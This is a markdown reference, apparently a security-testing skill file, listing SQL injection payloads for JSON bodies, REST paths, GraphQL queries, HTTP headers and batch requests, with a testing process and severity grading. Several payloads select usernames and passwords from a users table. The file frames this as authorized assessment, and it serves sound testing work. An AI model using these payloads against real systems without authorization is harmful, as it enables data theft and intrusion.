# API SQL Injection Payload

> ⚠️ **Security Boundary Statement**
> 
> This document is for **authorized AppSec assessment reference** only, helping identify vulnerability risk characteristics.
> 
> - All payloads are **technical principle demonstrations**, actual malicious operations are prohibited
> - Payloads are for understanding attack surface only, **do not enable harm**
> - Validation proves vulnerability existence, **no destructive operations**
> - See `SKILL.md` for specific execution boundaries
> 
> **Core Principle**: Prove existence, do not enable harm

---

## Source: PayloadsAllTheThings, HackTricks

## Manual Testing

**Note: Test for JSON, REST parameters, GraphQL and other API-specific scenarios, pay attention to closing and encoding**

---

## Validation Objectives (Within Security Boundary)

API SQL injection vulnerability validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| Injection Point Confirmation | ✓ Single quote trigger error | - | UNION sensitive data reading |
| Logic Bypass | ✓ `OR 1=1` test | - | Persistent unauthorized access |
| Time-based Blind | ✓ `SLEEP(5)` observe delay | - | Execute database commands |
| UNION Query | ❌ Not by default | ✓ UNION read test table only | Read credentials/configs |

**Safe Validation Method**: Use time delay, error echo, or logic bypass to prove existence; do not read sensitive data.
```json
# Basic closing
{"username": "admin'--", "password": "anything"}
{"username": "admin\"--", "password": "anything"}

# Logic bypass
{"id": "1 OR 1=1"}
{"id": 1, "username": "admin' OR '1'='1"}

# Union query
{"search": "' UNION SELECT NULL--"}
{"search": "1' UNION SELECT username, password FROM users--"}

# Blind injection (time/boolean)
{"id": "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"}
{"id": "1' AND SUBSTRING(version(),1,1)='5'--"}
```

## REST Parameter Injection
```http
# GET Query parameters
GET /api/users?id=1' OR '1'='1
GET /api/search?q=admin'--
GET /api/products?category=1' UNION SELECT NULL,NULL--

# Path parameters (note URL encoding)
GET /api/users/1'/
GET /api/users/1'%20OR%20'1'='1/profile
GET /api/v1/items/1;WAITFOR%20DELAY%20'0:0:5'--
```

## GraphQL Parameter Injection
```graphql
# Basic parameter injection
query { 
  user(id: "1' OR '1'='1") { 
    name 
    email 
  } 
}

# Filter condition injection
query { 
  users(where: {name: {eq: "admin'--"}}) { 
    id 
    role 
  } 
}

# Mutation injection
mutation {
  updateProfile(input: {userId: "1' OR '1'='1", bio: "hacked"}) {
    success
  }
}
```

## Header Injection
```http
# Common API authentication and tracking headers
X-Forwarded-For: 1' OR '1'='1
User-Agent: Mozilla/5.0' OR '1'='1
Authorization: Bearer admin'--
X-API-Key: admin' OR 1=1--

# SQL injection in Cookie
Cookie: session_id=1' AND SLEEP(5)--;
```

## Batch Operation Injection
```json
# Injection in Batch API
{
  "requests": [
    {"method": "GET", "path": "/api/users/1"},
    {"method": "GET", "path": "/api/users/1' OR '1'='1"}
  ]
}

# Array parameter injection (close array or IN clause)
{"ids": ["1)", "(SELECT password FROM users--"]}
{"ids": ["1", "2' OR '1'='1"]}
```

## Analysis Process (API Scenario)

1. Identify API endpoints and all input points (JSON Body, Query, Path, Headers, GraphQL parameters)
2. Try inputting single quote `'`, double quote `"`, backslash `\` to observe if API returns 500 error or database error message
3. For JSON format, ensure payload doesn't break JSON syntax structure (e.g., escape quotes `\"`)
4. Test boolean blind injection, observe if API returned JSON data structure or HTTP status code changes
5. Test time-based blind injection, observe if API response time significantly increases
6. Confirm injection point and database type

## Output

- Proof payload (JSON/HTTP request format)
- Complete request packet and response packet
- Database type and version information
- Extracted test data (e.g., current user)

## Severity Classification

API SQL injection severity is based on "the degree of exploit chain closure" — stable data retrieval is required for High; proof that only the injection point exists is Medium. 

| Actual case | Severity | Note |
|---------|------|------|
| UNION/blind injection stably retrieves real data | High | exploit chain closure, data is readable |
| Only confirmed injection point exists (boolean/time-based blind has response differences but no data retrieval) | Medium | capability confirmed, extraction not closed |
| error echo only (error triggered but injection is not controllable) | Low | Pending confirmation |
| blocked by WAF/parameterization; cannot inject | Low | defense effective |
| Bulk database dump / many credentials retrieved (>100 records) | Critical | massive data leak |

**Key judgment**:High requires"data actually retrieved"; time delay/boolean difference only is Medium. reading sensitive credential/configuration tables requires user authorization. 

---

## Prohibited

- ⚠️ No INSERT/UPDATE/DELETE operations
- ⚠️ No database dumping, only extract minimum data to prove vulnerability
- ⚠️ Avoid heavy queries that may cause API service crash